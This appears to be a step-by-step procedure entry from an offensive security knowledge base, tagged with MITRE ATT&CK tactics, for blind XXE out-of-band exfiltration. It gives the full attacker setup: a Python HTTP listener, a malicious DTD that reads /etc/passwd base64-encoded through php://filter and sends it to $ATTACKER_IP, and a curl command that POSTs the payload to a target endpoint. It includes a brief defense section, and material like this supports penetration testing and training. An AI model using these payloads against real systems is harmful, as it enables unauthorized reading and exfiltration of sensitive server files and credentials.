---
id: 15525130-1cbe-48b0-bf46-10b989ba6bc4
name: Blind-XXE-Data-Exfiltration-with-DTD-and-PHP-Filter
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exploit-Public-Facing-Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Exfiltration-Over-Alternative-Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
sub_techniques: []
tags:
  - '[[tags/blind-xxe]]'
  - '[[tags/oob-exfiltration]]'
  - '[[tags/xml-external-entity]]'
  - '[[tags/dtd]]'
  - '[[tags/php-filter]]'
commands:
  - '[[commands/start-python-http-server]]'
  - '[[commands/curl-send-xml-payload]]'
platforms:
  - Web
  - Linux
tools: []
validated: true
---

# Blind-XXE-Data-Exfiltration-with-DTD-and-PHP-Filter

## Summary

This procedure demonstrates how to perform blind XML External Entity (XXE) data exfiltration using a Document Type Definition (DTD) file hosted on an attacker-controlled server and the PHP filter to base64-encode sensitive file contents. It is effective against applications that parse untrusted XML input without disabling external entity processing, allowing out-of-band (OOB) retrieval of data like /etc/passwd when the direct response does not echo the exfiltrated content.

## Description

Blind XXE occurs when an XML parser processes external entities from untrusted input, enabling attackers to read local files or make external requests. In this technique, the attacker injects a malicious DOCTYPE that loads a remote DTD from their server. The DTD defines entities to read a target file (e.g., /etc/passwd) via the php://filter wrapper for base64 encoding, then redefines an exfiltration entity to send the encoded data back to the attacker's server as a URL parameter in an HTTP request. This OOB method bypasses blind scenarios where the application does not reflect the entity value in its response. The target environment is typically a web application (e.g., PHP-based) that accepts XML uploads or POSTs for processing, such as document parsers or APIs. Success results in the attacker receiving the base64-encoded file contents via server logs or access logs, which can then be decoded to reveal sensitive information like user credentials or system files.

## Requirements

1. A vulnerable web application that parses XML input from untrusted sources without disabling external entity resolution (e.g., libxml in PHP with libxml_disable_entity_loader set to false).
2. An attacker-controlled server with a public IP or domain to host the DTD file and receive exfiltrated data (e.g., via HTTP GET requests).
3. Knowledge of the target file path to exfiltrate (e.g., /etc/passwd on Linux targets).
4. Network access to send requests to the target application endpoint.
5. Tools like curl for sending the payload and a simple HTTP server (e.g., Python's built-in) on the attacker machine.

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers (e.g., set libxml_disable_entity_loader(true) in PHP or equivalent in other languages).
- Implement strict input validation and sanitization to reject or strip DOCTYPE declarations and external entity references in XML input.
- Use a Web Application Firewall (WAF) to detect and block common XXE patterns, such as php://filter or external SYSTEM entities.
- Monitor outbound network traffic from the application server for unexpected HTTP requests to attacker-controlled domains or unusual query parameters.
- Enable XML parser logging to capture entity expansion attempts and audit application logs for XML processing errors.

## Objectives

1. Inject a malicious XML payload to trigger external entity loading from an attacker-controlled DTD.
2. Use the PHP filter to base64-encode and exfiltrate the contents of a sensitive target file out-of-band.
3. Receive and decode the exfiltrated data on the attacker server to access sensitive information like system files or credentials.

## Instructions

### Step 1: Set Up Attacker-Controlled HTTP Server for DTD Hosting and Exfiltration Reception

**Context**: This step prepares the attacker's server to serve the DTD file and capture incoming exfiltration requests, which will contain the base64-encoded data as a query parameter. The server logs will record the GET request triggered by the entity expansion.

**Command** ([[commands/start-python-http-server]]):
```bash
python3 -m http.server 80
```

> This command starts a simple HTTP server on port 80 using Python 3, serving files from the current directory. Place the dtd.xml file in this directory. Monitor the terminal output or access logs (/var/log/apache2 or similar if using Apache) for incoming GET requests to /dtd.xml? followed by base64 data. Expected output includes server startup message like "Serving HTTP on 0.0.0.0 port 80" and log entries for requests.

### Step 2: Create the DTD File on the Attacker Server

**Context**: The DTD file defines the entities for reading the target file with base64 encoding and triggering the exfiltration request. This file is loaded remotely by the injected XML on the target.

**Instructions**: Create a file named dtd.xml on the attacker server with the following content (replace /etc/passwd with the desired target file path):

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://$ATTACKER_IP/dtd.xml?%data;'>">
```

> Save this as dtd.xml in the directory served by the HTTP server from Step 1. The %data entity uses the PHP filter to read and encode the file. The %param1 entity dynamically defines the exfil entity to make an HTTP request back to the attacker server with the encoded data in the query string. No direct command output, but verify the file exists with ls dtd.xml.

### Step 3: Craft the Main XML Payload

**Context**: This step creates the primary XML input that includes a DOCTYPE referencing the remote DTD, causing the target parser to load it and expand the exfil entity during processing.

**Code** ([[codes/Blind-XXE-Exfiltration-XML-Payload-and-DTD]]):

> Use the provided XML code snippet as the payload. Replace http://127.0.0.1 with your actual $ATTACKER_IP (e.g., http://attacker.com). Save it as payload.xml. The DOCTYPE loads the remote DTD, evaluates its entities, and expands &exfil; to trigger the OOB request. Expected: The file is ready for injection without errors.

### Step 4: Inject the Payload into the Target Application

**Context**: Send the crafted XML payload to the vulnerable endpoint (e.g., a file upload or XML-processing API) to trigger the XXE processing and exfiltration.

**Command** ([[commands/curl-send-xml-payload]]):
```bash
curl -X POST http://target.com/xml-endpoint -H "Content-Type: application/xml" --data-binary @payload.xml
```

> This command sends the XML payload via a POST request to the target's XML-processing endpoint. Adjust the URL and headers as needed for the application (e.g., add authentication if required). The target parser will load the remote DTD, expand entities, and make an outbound request to your server with the exfiltrated data. Expected output: A generic success response from the target (e.g., HTTP 200 OK), since it's blind—no data in response. Check your attacker server logs immediately after for the exfiltration GET request.
